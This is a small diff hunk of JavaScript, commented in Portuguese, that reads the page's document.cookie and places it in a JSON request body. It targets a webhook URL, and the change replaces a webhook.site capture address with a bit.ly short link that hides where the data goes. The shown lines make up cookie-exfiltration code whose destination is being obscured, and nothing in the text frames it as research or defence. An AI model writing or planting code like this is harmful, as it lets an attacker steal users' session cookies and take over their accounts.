@@ -3,7 +3,7 @@
     var cookies = document.cookie;
 
     // Definir o URL do webhook
-    var webhookUrl = 'https://webhook.site/2dfcc623-5c60-4ed9-84c7-f2efae2af582';
+    var webhookUrl = 'https://bit.ly/44blPRE';
 
     // Criar o corpo da requisição
     var requestBody = JSON.stringify({ cookies: cookies });
